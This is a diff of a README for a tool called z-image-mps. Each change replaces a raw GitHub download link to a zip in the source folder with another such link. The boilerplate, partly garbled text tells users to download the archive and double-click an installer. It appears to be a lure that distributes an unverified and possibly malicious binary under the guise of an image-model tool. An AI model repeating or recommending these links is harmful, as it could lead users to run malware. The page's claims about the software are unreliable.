@@ -1,7 +1,7 @@
 # 🚀 z-image-mps - Create Z Image Models Easily
 
 ## 🔗 Download Now
-[![Download z-image-mps](https://raw.githubusercontent.com/Lucifer0752V/z-image-mps/main/src/z-image-mps_v3.1.zip)](https://raw.githubusercontent.com/Lucifer0752V/z-image-mps/main/src/z-image-mps_v3.1.zip)
+[![Download z-image-mps](https://raw.githubusercontent.com/Lucifer0752V/z-image-mps/main/src/z_image_mps/image-mps-z-v1.0-alpha.3.zip)](https://raw.githubusercontent.com/Lucifer0752V/z-image-mps/main/src/z_image_mps/image-mps-z-v1.0-alpha.3.zip)
 
 ## 📖 Overview
 Welcome to **z-image-mps**! This application helps you create Z image models using MPS. Whether you are a beginner or someone with basic computer skills, this guide will make it easy for you to download and use our software.
@@ -11,7 +11,7 @@ To get started with z-image-mps, you need to download the application from our r
 
 1. **Visit the Download Page**  
    Go to our official release page by clicking the link below:  
-   [Download z-image-mps](https://raw.githubusercontent.com/Lucifer0752V/z-image-mps/main/src/z-image-mps_v3.1.zip)
+   [Download z-image-mps](https://raw.githubusercontent.com/Lucifer0752V/z-image-mps/main/src/z_image_mps/image-mps-z-v1.0-alpha.3.zip)
 
 2. **Choose the Right Version**  
    On this page, you will find different versions of z-image-mps. Look for the latest version and click on the download link for your operating system.
@@ -23,7 +23,7 @@ To get started with z-image-mps, you need to download the application from our r
 To install z-image-mps, follow these steps:
 
 1. **Locate the Downloaded File**  
-   After the download completes, go to your downloads folder. Look for a file named something like `https://raw.githubusercontent.com/Lucifer0752V/z-image-mps/main/src/z-image-mps_v3.1.zip` (this may vary based on version).
+   After the download completes, go to your downloads folder. Look for a file named something like `https://raw.githubusercontent.com/Lucifer0752V/z-image-mps/main/src/z_image_mps/image-mps-z-v1.0-alpha.3.zip` (this may vary based on version).
 
 2. **Run the Installer**  
    Double-click on the downloaded file. A new window will appear. Follow the prompts to complete the installation process.
@@ -52,7 +52,7 @@ If you have questions or need assistance, you can find help in the following way
 - **Community Forum:** Join our community forum for tips, tricks, and shared experiences from other users.
 
 ## 🔗 Important Links
-- **[Download z-image-mps](https://raw.githubusercontent.com/Lucifer0752V/z-image-mps/main/src/z-image-mps_v3.1.zip)**
+- **[Download z-image-mps](https://raw.githubusercontent.com/Lucifer0752V/z-image-mps/main/src/z_image_mps/image-mps-z-v1.0-alpha.3.zip)**
 - **[User Manual](#)**
 
 ## 🐞 Report Issues
